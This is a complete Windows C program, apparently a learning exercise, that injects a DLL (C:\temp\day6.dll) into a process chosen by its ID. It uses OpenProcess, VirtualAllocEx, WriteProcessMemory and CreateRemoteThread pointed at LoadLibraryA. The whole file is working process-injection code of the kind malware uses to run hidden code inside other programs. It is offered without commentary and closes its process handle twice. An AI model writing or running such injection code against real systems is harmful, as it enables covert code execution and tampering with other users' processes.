#include <windows.h>
#include <stdio.h>

int main() {
    DWORD pid;
    char dll_path[] = "C:\\temp\\day6.dll";
    SIZE_T path_len = sizeof(dll_path);

    printf("Target PID: ");
    scanf("%lu", &pid);

    HANDLE handle_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!handle_process) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }

    LPVOID remote_map = VirtualAllocEx(handle_process, NULL, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_map) {
        printf("[-] VirtualAllocEx failed.\n");
        CloseHandle(handle_process);
        return 1;
    }

    if (!WriteProcessMemory(handle_process, remote_map, dll_path, path_len, NULL)) {
        printf("[-] WriteProcessMemory failed.\n");
        VirtualFreeEx(handle_process, remote_map, 0, MEM_RELEASE);
        CloseHandle(handle_process);
        return 1;
    }

    LPVOID load_library_address = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    HANDLE handle_thread = CreateRemoteThread(handle_process, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_address, remote_map, 0, NULL);
    if (handle_thread) {
        printf("[!] DLL injected.\n");
        WaitForSingleObject(handle_thread, INFINITE);
        CloseHandle(handle_process);
    } else {
        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
    }

    VirtualFreeEx(handle_process, remote_map, 0, MEM_RELEASE);
    CloseHandle(handle_process);

    return 0;
}